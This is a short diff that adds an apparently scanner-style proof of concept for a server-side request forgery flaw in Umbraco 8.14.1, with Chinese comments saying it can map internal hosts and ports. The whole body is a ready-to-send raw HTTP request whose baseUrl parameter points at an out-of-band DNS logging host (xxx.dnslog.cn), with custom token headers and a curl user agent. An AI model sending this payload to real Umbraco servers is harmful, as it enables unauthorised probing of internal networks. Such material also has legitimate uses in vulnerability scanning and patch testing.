@@ -1,0 +1,9 @@
+# Umbraco服务器请求伪造漏洞
+# Umbraco 8.14.1 - baseUrl 存在服务器端请求伪造漏洞，可用于识别内部主机和端口。
+GET /umbraco/BackOffice/Api/Help/GetContextHelpForPage?section=content&tree=undefined&baseUrl=http://xxx.dnslog.cn&acid=80001712&bid=hd_tag_m8mv25gi HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25gi
+RM-PRO-Token: 68ded2c435828e35fbe057d6e10a0ca2
+RM-PRO-Time: 1742808466301
+User-Agent: curl/7.83.1
+
